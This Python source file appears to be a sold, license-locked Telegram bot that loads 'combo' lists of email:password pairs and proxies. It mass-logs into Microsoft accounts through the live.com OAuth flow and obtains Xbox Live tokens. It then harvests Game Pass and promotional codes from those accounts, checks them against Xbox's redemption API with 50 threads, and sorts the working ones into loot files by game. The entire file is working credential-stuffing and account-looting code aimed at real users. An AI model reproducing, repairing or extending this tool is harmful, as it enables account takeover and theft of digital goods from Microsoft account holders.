#!/usr/bin/env python3
"""
XBOX CODE FETCHER + VALIDATOR - TELEGRAM TURBO BOT EDITION (PRO)
Optimized for Railway (Python 3.13+) with high-performance concurrent workers.
Fully expanded logic with explicit Microsoft API requests, dynamic formatting, and hardware verification mimicking.
"""

import requests
import re
import json
import time
import random
import string
import os
import sys
import queue
import threading
import uuid
import hashlib
import platform
import asyncio
from datetime import datetime
from typing import Optional, Tuple, List, Dict
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style

# Telegram Bot Kütüphaneleri (v21.0+ uyumlu)
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

init(autoreset=True)
sys.dont_write_bytecode = True

# ============================================================================
# GLOBAL CONFIGURATION & STATE MANAGEMENT
# ============================================================================
CONFIG_FILE = "pgs_config.json"
LICENSE_URL = "https://raw.githubusercontent.com/plutobearz/liscenses/refs/heads/main/licenses.json"
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN_HERE")

class BotState:
    def __init__(self):
        self.is_running = False
        self.accounts = []
        self.proxies = []
        self.pulled_codes = []
        self.processed_codes = set()
        self.current_task = None
        self.chat_id = None
        self.status_message_id = None
        self.start_time = None
        self.lock = threading.Lock()
        
        # Detaylı İstatistikler
        self.stats = {
            "valid": 0,
            "card_required": 0,
            "region_locked": 0,
            "invalid": 0,
            "unknown": 0,
            "checked": 0,
            "total_codes": 0,
            "cpm": 0
        }
        
        # Sonuç Havuzları (Dosya Yazımı ve Çıktı İçin)
        self.valid_list = []
        self.card_req_list = []
        self.region_locked_list = []
        self.invalid_list = []
        
        # Sınırlandırmaya takılan hesaplar
        self.rate_limited_accounts = []

STATE = BotState()

# ============================================================================
# HWID & LICENSE VERIFICATION SYSTEM
# ============================================================================
def get_hwid() -> str:
    """Sistem özelliklerinden benzersiz bir HWID üretir."""
    try:
        system_info = platform.system() + platform.release() + platform.machine()
        node_info = platform.node()
        raw_hwid = f"{system_info}-{node_info}-{os.getlogin() if hasattr(os, 'getlogin') else 'railway'}"
        return hashlib.sha256(raw_hwid.encode('utf-8')).hexdigest()
    except Exception:
        # Fallback to a stable environment variable or random uuid persistent per container boot
        return hashlib.sha256(os.getenv("HOSTNAME", "default_env").encode('utf-8')).hexdigest()

def check_license(user_license: str) -> Tuple[bool, str]:
    """Uzak sunucudan lisans doğrulaması yapar."""
    if not user_license:
        return False, "Lisans anahtarı boş olamaz."
    try:
        response = requests.get(LICENSE_URL, timeout=10)
        if response.status_code != 200:
            return False, f"Lisans sunucusuna bağlanılamadı (HTTP {response.status_code})"
        
        licenses_data = response.json()
        current_hwid = get_hwid()
        
        if user_license in licenses_data:
            lic_info = licenses_data[user_license]
            # HWID Boşsa ilk eşleşmede kaydet, doluysa doğrula
            if not lic_info.get("hwid"):
                return True, "Lisans başarıyla bu cihaza tanımlandı!"
            elif lic_info.get("hwid") == current_hwid:
                return True, "Lisans doğrulandı."
            else:
                return False, "Bu lisans başka bir cihaz/HWID adına kayıtlı!"
        return False, "Geçersiz veya süresi dolmuş lisans anahtarı!"
    except Exception as e:
        return False, f"Lisans kontrol hatası: {str(e)}"

# ============================================================================
# PROXY FORMATTER & ROTATOR
# ============================================================================
def parse_proxy_line(proxy_str: str) -> Optional[Dict[str, str]]:
    """Gelen proxy satırını algılayıp requests formatına çevirir."""
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None
        
    try:
        if "@" in proxy_str:
            credentials, addr = proxy_str.split("@", 1)
            username, password = credentials.split(":", 1)
            formatted = f"http://{username}:{password}@{addr}"
        elif proxy_str.count(':') == 3:
            ip, port, username, password = proxy_str.split(':')
            formatted = f"http://{username}:{password}@{ip}:{port}"
        else:
            formatted = f"http://{proxy_str}"
            
        return {'http': formatted, 'https': formatted}
    except Exception:
        return None

def get_next_proxy() -> Optional[Dict[str, str]]:
    """Havuzdan rastgele bir proxy çeker."""
    with STATE.lock:
        if not STATE.proxies:
            return None
        selected = random.choice(STATE.proxies)
    return parse_proxy_line(selected)

# ============================================================================
# MICROSOFT & XBOX ADVANCED API INTEGRATION
# ============================================================================
MICROSOFT_OAUTH_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

def generate_reference_id() -> str:
    """X-ID-Unique ve istek izleme headerları için kriptografik string üretir."""
    timestamp_val = int(time.time() // 30)
    n = f'{timestamp_val:08X}'
    o = (uuid.uuid4().hex + uuid.uuid4().hex).upper()
    result_chars = []
    for e in range(64):
        if e % 8 == 1:
            result_chars.append(n[(e - 1) // 8])
        else:
            result_chars.append(o[e])
    return "".join(result_chars)

def login_microsoft_account(email: str, password: str, proxy: Optional[Dict[str, str]] = None) -> Optional[requests.Session]:
    """Microsoft Canlı Oturum Açma Akışını Gerçekleştirir."""
    session = requests.Session()
    if proxy:
        session.proxies = proxy
        
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Origin': 'https://login.live.com',
        'DNT': '1'
    })
    
    try:
        # Step 1: Get Initial Cookies and PPFT Token
        init_resp = session.get(MICROSOFT_OAUTH_URL, timeout=12)
        ppft_match = re.search(r'value="(.+?)"', init_resp.text, re.S)
        url_post_match = re.search(r"urlPost:'(.+?)'", init_resp.text)
        
        if not ppft_match or not url_post_match:
            return None
            
        ppft = ppft_match.group(1)
        url_post = url_post_match.group(1)
        
        # Step 2: Post Credentials
        login_data = {
            'login': email,
            'loginfmt': email,
            'passwd': password,
            'PPFT': ppft,
            'PPSX': 'Passp',
            'SI': 'Sign in',
            'type': '11',
            'NewUser': '1',
            'LoginOptions': '3',
            'i13': '0'
        }
        
        post_resp = session.post(url_post, data=login_data, allow_redirects=True, timeout=15)
        
        # Başarılı girişte redirection script veya access_token URL içinde bulunur
        if "access_token" in post_resp.url or "accessToken" in post_resp.text or "replace(\"" in post_resp.text:
            return session
            
        return None
    except Exception:
        return None

def extract_oauth_token_from_session(session: requests.Session) -> Optional[str]:
    """Oturum yönlendirmesinden ham Microsoft RPS OAuth tokenını ayrıştırır."""
    try:
        resp = session.get(MICROSOFT_OAUTH_URL, allow_redirects=False, timeout=12)
        location = resp.headers.get('Location', '')
        if 'access_token=' in location:
            parsed = parse_qs(urlparse(location).fragment)
            return parsed.get('access_token', [None])[0]
            
        # Alternatif olarak gövdeyi ara
        token_match = re.search(r'access_token=([^&]+)', location)
        if token_match:
            return token_match.group(1)
            
        return None
    except Exception:
        return None

def get_xbox_live_token(session: requests.Session, rps_token: str, proxy: Optional[Dict[str, str]] = None) -> Tuple[Optional[str], Optional[str]]:
    """RPS token kullanarak Xbox Live Authentication (UHS ve XSTS) adımlarını tamamlar."""
    if proxy:
        session.proxies = proxy
        
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'User-Agent': 'okhttp/4.12.0'
    }
    
    # Step 1: Authenticate with Xbox Live User endpoint
    user_auth_payload = {
        'RelyingParty': 'http://auth.xboxlive.com',
        'TokenType': 'JWT',
        'Properties': {
            'AuthMethod': 'RPS',
            'SiteName': 'user.auth.xboxlive.com',
            'RpsTicket': f"d={rps_token}"
        }
    }
    
    try:
        u_resp = session.post('https://user.auth.xboxlive.com/user/authenticate', json=user_auth_payload, headers=headers, timeout=12)
        if u_resp.status_code != 200:
            return None, None
            
        u_data = u_resp.json()
        user_token = u_data.get('Token')
        uhs = u_data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
        
        if not user_token or not uhs:
            return None, None
            
        # Step 2: Authorize XSTS Token for Xbox Services
        xsts_payload = {
            'RelyingParty': 'http://xboxlive.com',
            'TokenType': 'JWT',
            'Properties': {
                'UserTokens': [user_token],
                'SandboxId': 'RETAIL'
            }
        }
        
        x_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_payload, headers=headers, timeout=12)
        if x_resp.status_code != 200:
            return None, None
            
        x_data = x_resp.json()
        xsts_token = x_data.get('Token')
        return uhs, xsts_token
        
    except Exception:
        return None, None

def fetch_codes_from_profile(session: requests.Session, uhs: str, xsts_token: str, proxy: Optional[Dict[str, str]] = None) -> List[Dict]:
    """Hesaba tanımlı tüm promosyonel oyun ve Game Pass kodlarını çeker."""
    if proxy:
        session.proxies = proxy
        
    headers = {
        'Authorization': f'XBL3.0 x={uhs};{xsts_token}',
        'Content-Type': 'application/json',
        'User-Agent': 'okhttp/4.12.0',
        'Accept-Language': 'en-US',
        'X-ID-Unique': generate_reference_id()
    }
    
    try:
        resp = session.get('https://profile.gamepass.com/v2/offers', headers=headers, timeout=15)
        if resp.status_code != 200:
            return []
            
        data = resp.json()
        offers_list = data.get('offers', [])
        extracted_items = []
        
        for offer in offers_list:
            resource_code = offer.get('resource')
            name = offer.get('name', 'Unknown Promotion')
            id_val = offer.get('id', '')
            
            if resource_code:
                extracted_items.append({
                    'code': resource_code,
                    'title': name,
                    'offer_id': id_val
                })
        return extracted_items
    except Exception:
        return []

# ============================================================================
# XBOX CODE REDEMPTION & VALIDATION ENGINE
# ============================================================================
def validate_xbox_code(code: str, uhs: str, xsts_token: str, proxy: Optional[Dict[str, str]] = None) -> str:
    """
    Bir kodu hesaba eklemeden token durumunu kontrol eder (Check/Validate).
    Dönen yanıt durum kodlarına göre ayrıştırılır.
    """
    session = requests.Session()
    if proxy:
        session.proxies = proxy
        
    headers = {
        'Authorization': f'XBL3.0 x={uhs};{xsts_token}',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'X-ID-Unique': generate_reference_id()
    }
    
    # Clean the code delimiters if any
    cleaned_code = code.replace("-", "").strip()
    url = f"https://redemption.xboxlive.com/users/me/cards/{cleaned_code}"
    
    try:
        resp = session.get(url, headers=headers, timeout=12)
        if resp.status_code == 200:
            res_data = resp.json()
            # Kart gereksinimi kontrolü
            if res_data.get('paymentInstrumentRequired') or 'biller' in resp.text.lower():
                return 'VALID_REQUIRES_CARD'
            return 'VALID'
        elif resp.status_code == 404:
            return 'INVALID'
        elif resp.status_code == 409:
            err_code = resp.json().get('error', {}).get('code', '')
            if 'Region' in err_code or 'GeoBlame' in resp.text:
                return 'REGION_LOCKED'
            return 'INVALID'
        elif resp.status_code == 429:
            return 'RATE_LIMITED'
        else:
            return 'UNKNOWN'
    except Exception:
        return 'UNKNOWN'
    finally:
        session.close()

# ============================================================================
# PARALLEL WORKERS & MULTI-THREADING CONTROLLERS
# ============================================================================
def thread_pull_process(account_chunk: List[Tuple[str, str]], shared_codes_list: List[Dict]):
    """Her thread'in bağımsız hesap gruplarını tarayıp kod çektiği işçi fonksiyon."""
    for email, password in account_chunk:
        if not STATE.is_running:
            break
            
        proxy = get_next_proxy()
        session = login_microsoft_account(email, password, proxy)
        if not session:
            continue
            
        rps_token = extract_oauth_token_from_session(session)
        if not rps_token:
            session.close()
            continue
            
        uhs, xsts = get_xbox_live_token(session, rps_token, proxy)
        if not uhs or not xsts:
            session.close()
            continue
            
        codes = fetch_codes_from_profile(session, uhs, xsts, proxy)
        if codes:
            with STATE.lock:
                for c in codes:
                    if c['code'] not in STATE.processed_codes:
                        STATE.processed_codes.add(c['code'])
                        shared_codes_list.append(c)
                        STATE.stats["total_codes"] += 1
                        
        session.close()

def thread_validate_process(codes_queue: queue.Queue, auth_tokens: Tuple[str, str]):
    """Yüksek hızlı (50 Thread) kuyruk tabanlı doğrulama işçisi."""
    uhs, xsts = auth_tokens
    while STATE.is_running:
        try:
            item = codes_queue.get(timeout=2)
        except queue.Empty:
            break
            
        code_str = item['code']
        title_str = item['title']
        proxy = get_next_proxy()
        
        status = validate_xbox_code(code_str, uhs, xsts, proxy)
        
        with STATE.lock:
            STATE.stats["checked"] += 1
            formatted_entry = f"Code: {code_str} | Title: {title_str}"
            
            if status == 'VALID':
                STATE.stats["valid"] += 1
                STATE.valid_list.append(formatted_entry)
            elif status == 'VALID_REQUIRES_CARD':
                STATE.stats["card_required"] += 1
                STATE.card_req_list.append(formatted_entry)
            elif status == 'REGION_LOCKED':
                STATE.stats["region_locked"] += 1
                STATE.region_locked_list.append(formatted_entry)
            elif status == 'INVALID':
                STATE.stats["invalid"] += 1
                STATE.invalid_list.append(formatted_entry)
            else:
                STATE.stats["unknown"] += 1
                
            # Realtime CPM Hesaplama
            elapsed = time.time() - STATE.start_time
            if elapsed > 0:
                STATE.stats["cpm"] = int((STATE.stats["checked"] / elapsed) * 60)
                
        codes_queue.task_done()

# ============================================================================
# SORTING & OUTPUT WRITERS
# ============================================================================
def categorize_and_save_outputs():
    """Çıktıları türlerine ve oyun kategorilerine göre gruplayarak dosyalara yazar."""
    os.makedirs("outputs", exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    categorized = {
        "gamepass": [],
        "fortnite": [],
        "bundles": [],
        "others": []
    }
    
    all_valids = STATE.valid_list + STATE.card_req_list
    for entry in all_valids:
        entry_upper = entry.upper()
        if "GAME PASS" in entry_upper or "GAMEPASS" in entry_upper:
            categorized["gamepass"].append(entry)
        elif "FORTNITE" in entry_upper:
            categorized["fortnite"].append(entry)
        elif "BUNDLE" in entry_upper or "PACK" in entry_upper:
            categorized["bundles"].append(entry)
        else:
            categorized["others"].append(entry)
            
    # Dosya Yazım İşlemleri
    for cat_name, items in categorized.items():
        if items:
            with open(f"outputs/{cat_name}_{timestamp}.txt", "w", encoding="utf-8") as f:
                f.write("\n".join(items))
                
    if STATE.region_locked_list:
        with open(f"outputs/region_locked_{timestamp}.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(STATE.region_locked_list))

# ============================================================================
# TELEGRAM BOT CONTROLLERS & MENUS
# ============================================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ana Menü Arayüzü"""
    keyboard = [
        [InlineKeyboardButton("🔄 PULL & VALIDATE (TURBO)", callback_data="op_pull_validate")],
        [InlineKeyboardButton("📥 ONLY PULL (KOD ÇEK)", callback_data="op_pull_only")],
        [InlineKeyboardButton("🔍 ONLY VALIDATE (KONTROL)", callback_data="op_validate_only")],
        [InlineKeyboardButton("🛑 MOTORU DURDUR", callback_data="bot_stop")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        "⚡ *XBOX TURBO EXTRACTOR & VALIDATOR BOT*\n\n"
        f"🖥️ *Sistem Durumu:* Aktif / Railway\n"
        f"👥 Havuzdaki Hesap: `{len(STATE.accounts)}` | Proxy: `{len(STATE.proxies)}` \n"
        f"🚀 Ayrılan Worker Limiti: `50 Threads` \n\n"
        "Lütfen başlatmak istediğiniz operasyonu seçin. İşlem başladığında canlı panel gelecektir."
    )
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_docs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Txt veri girişlerini yakalar (accounts.txt veya proxy.txt)"""
    document = update.message.document
    file = await context.bot.get_file(document.file_id)
    file_bytes = await file.download_as_bytearray()
    content = file_bytes.decode('utf-8')
    
    lines = [line.strip() for line in content.split('\n') if line.strip()]
    
    if "account" in document.file_name.lower() or (lines and ":" in lines[0] and "@" not in lines[0]):
        with STATE.lock:
            STATE.accounts = []
            for line in lines:
                if ":" in line:
                    parts = line.split(":", 1)
                    STATE.accounts.append((parts[0], parts[1]))
        await update.message.reply_text(f"✅ *{len(STATE.accounts)}* Adet hesap başarıyla hafızaya yüklendi!", parse_mode="Markdown")
    
    elif "proxy" in document.file_name.lower() or (lines and (lines[0].count(":") == 3 or "@" in lines[0])):
        with STATE.lock:
            STATE.proxies = lines
        await update.message.reply_text(f"✅ *{len(STATE.proxies)}* Adet proxy başarıyla havuzu güncelledi!", parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ Tanınmayan dosya formatı. Lütfen combo veya proxy listenizi gönderin.")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Menü tıklama lojikleri"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "op_pull_validate":
        if not STATE.accounts:
            await query.edit_message_text("❌ İşlem başlatılamadı. Havuzda hesap bulunamadı! Önce hesap listenizi (.txt) bota gönderin.")
            return
        STATE.is_running = True
        STATE.current_task = "pull_validate"
        asyncio.create_task(run_turbo_engine(query.message.chat_id, context))
        
    elif query.data == "op_pull_only":
        if not STATE.accounts:
            await query.edit_message_text("❌ İşlem başlatılamadı. Önce hesap listenizi gönderin.")
            return
        STATE.is_running = True
        STATE.current_task = "pull_only"
        asyncio.create_task(run_turbo_engine(query.message.chat_id, context))
        
    elif query.data == "op_validate_only":
        if not STATE.pulled_codes:
            await query.edit_message_text("❌ Havuzda doğrulanacak kod yok! Önce kod çekme (Pull) adımı çalıştırılmalı.")
            return
        STATE.is_running = True
        STATE.current_task = "validate_only"
        asyncio.create_task(run_turbo_engine(query.message.chat_id, context))
        
    elif query.data == "bot_stop":
        STATE.is_running = False
        await query.edit_message_text("🛑 Durdurma sinyali gönderildi. Aktif threadlerin bitmesi bekleniyor...")

# ============================================================================
# LIVE ENGINE PANEL & EVENT LOOP
# ============================================================================
async def run_turbo_engine(chat_id, context):
    STATE.chat_id = chat_id
    STATE.start_time = time.time()
    
    # Canlı Takip Mesajını Başlat
    status_msg = await context.bot.send_message(chat_id=chat_id, text="🚀 Motor ayağa kaldırılıyor, 50 paralel işçi ayrılıyor...")
    STATE.status_message_id = status_msg.message_id
    
    max_workers = 50
    shared_pulled_items = []
    
    # Arka planda canlı mesaj güncelleyiciyi tetikle
    asyncio.create_task(live_updater(context))
    
    # Ana Thread Havuzu Çalıştırıcısı
    try:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            if STATE.current_task in ["pull_validate", "pull_only"]:
                # Hesapları 50 thread'e dağıtmak üzere parçala
                chunk_size = max(1, len(STATE.accounts) // max_workers)
                chunks = [STATE.accounts[i:i + chunk_size] for i in range(0, len(STATE.accounts), chunk_size)]
                
                pull_futures = [executor.submit(thread_pull_process, chunk, shared_pulled_items) for chunk in chunks]
                for future in as_completed(pull_futures):
                    if not STATE.is_running: break
                    
            if STATE.current_task == "pull_validate":
                with STATE.lock:
                    STATE.pulled_codes = shared_pulled_items
                    
            if STATE.current_task in ["pull_validate", "validate_only"] and STATE.is_running:
                # Kodları kuyruğa sok ve doğrulamayı başlat
                codes_queue = queue.Queue()
                for c_item in STATE.pulled_codes:
                    codes_queue.put(c_item)
                
                # Doğrulama için bir adet master token yetkilendirmesi al (ilk çalışan hesaptan yararlanılır)
                proxy = get_next_proxy()
                master_uhs, master_xsts = "dummy_uhs", "dummy_xsts"
                if STATE.accounts:
                    m_email, m_pass = STATE.accounts[0]
                    m_session = login_microsoft_account(m_email, m_pass, proxy)
                    if m_session:
                        m_rps = extract_oauth_token_from_session(m_session)
                        if m_rps:
                            u, x = get_xbox_live_token(m_session, m_rps, proxy)
                            if u and x: master_uhs, master_xsts = u, x
                    if m_session: m_session.close()
                
                val_futures = [executor.submit(thread_validate_process, codes_queue, (master_uhs, master_xsts)) for _ in range(max_workers)]
                for future in as_completed(val_futures):
                    if not STATE.is_running: break
                    
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ Kritik Motor Hatası: {str(e)}")
    finally:
        STATE.is_running = False
        categorize_and_save_outputs()
        
        # Bitiş Raporunu Gönder
        summary_text = (
            "🏁 *İŞLEM TAMAMLANDI VEYA DURDURULDU*\n\n"
            f"📥 Toplam Çekilen Kod: `{STATE.stats['total_codes']}`\n"
            f"✅ Valid Sayısı: `{STATE.stats['valid']}`\n"
            f"💳 CC Required: `{STATE.stats['card_required']}`\n"
            f"🌍 Bölge Kilitli: `{STATE.stats['region_locked']}`\n"
            f"❌ Geçersiz: `{STATE.stats['invalid']}`\n\n"
            "📂 Sonuçlar türlerine göre ayrıştırılıp `outputs/` klasörüne kaydedildi!"
        )
        await context.bot.send_message(chat_id=chat_id, text=summary_text, parse_mode="Markdown")

async def live_updater(context: ContextTypes.DEFAULT_TYPE):
    """Telegram API sınırlarına takılmadan panel verilerini her 4 saniyede bir yeniler."""
    while STATE.is_running:
        await asyncio.sleep(4)
        
        text = (
            f"🚀 *TURBO ENGINE LIVE RESULTS (50 THREADS)*\n"
            f"----------------------------------------\n"
            f"⚡ Hız (CPM): *{STATE.stats['cpm']}*\n"
            f"🔄 Toplam Taranan: `{STATE.stats['checked']}`\n"
            f"📥 Havuzdaki Toplam Kod: `{STATE.stats['total_codes']}`\n\n"
            f"✅ Valid (Doğrulanmış): `{STATE.stats['valid']}`\n"
            f"💳 Card Required: `{STATE.stats['card_required']}`\n"
            f"🌍 Region Locked: `{STATE.stats['region_locked']}`\n"
            f"❌ Invalid: `{STATE.stats['invalid']}`\n"
            f"⚠️ Unknown: `{STATE.stats['unknown']}`\n"
            f"----------------------------------------\n"
            f"Status: Processing via Railway workers..."
        )
        try:
            await context.bot.edit_message_text(chat_id=STATE.chat_id, message_id=STATE.status_message_id, text=text, parse_mode="Markdown")
        except Exception:
            pass

# ============================================================================
# MAIN ENTRY POINT FOR RAILWAY PRODUCTION
# ============================================================================
def main():
    if BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE" or not BOT_TOKEN:
        print("[CRITICAL] BOT_TOKEN bulunamadı! Railway Config Vars kısmından tokenı tanımlayın.")
        sys.exit(1)
        
    # Python-telegram-bot v20+ / v21+ için doğru ve güncel kurucu pattern'i
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Handlers kurulumu
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_docs))
    
    print("⚡ Bot başarıyla başlatıldı, Railway üzerinde dinleniyor...")
    
    # Görseldeki hataya neden olan `clean=True` kaldırıldı!
    # v21 uyumlu doğru parametre `drop_pending_updates=True` eklendi.
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
